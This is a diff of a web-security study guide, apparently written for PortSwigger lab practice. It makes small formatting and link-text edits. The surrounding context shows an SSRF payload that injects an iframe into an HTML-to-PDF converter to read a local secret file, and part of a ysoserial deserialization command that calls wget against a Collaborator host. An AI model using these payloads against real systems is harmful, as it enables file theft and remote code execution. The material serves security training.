@@ -1826,9 +1826,9 @@ body: JSON.stringify({
 
 [PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)  
 
->Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as wkhtmltopdf to read local file (SSRF).  
+>Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as ```wkhtmltopdf``` to read local file (SSRF).  
 
-[thehackerish showing wkHTMLtoPDF exploit using https://www.root-me.org/ ctf lab](https://youtu.be/Prqt3N5QU2Q?t=345)  
+>Thehackerish showing wkHTMLtoPDF exploitation using [https://www.root-me.org/](https://www.root-me.org/) CTF lab in the video [Pentest SSRF Ep4](https://youtu.be/Prqt3N5QU2Q?t=345)  
 
 ```html
 <html>
@@ -1849,7 +1849,7 @@ body: JSON.stringify({
 
 ```JSON
 {
-	"tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
+ "tableHtml":"<div><p>SSRF in HTMLtoPDF</p><iframe src='file:///home/carlos/secret' height='500' width='500'>"
 }
 ```  
 
@@ -2290,7 +2290,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
   
 ## YouTube Training Playlist 
   
-[YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
+[My YouTube Study Playlist](https://youtube.com/playlist?list=PLsDxQTEdg_YkVMP6PybE7I-hAdhR7adem)  
 
 Youtube channels:  
 
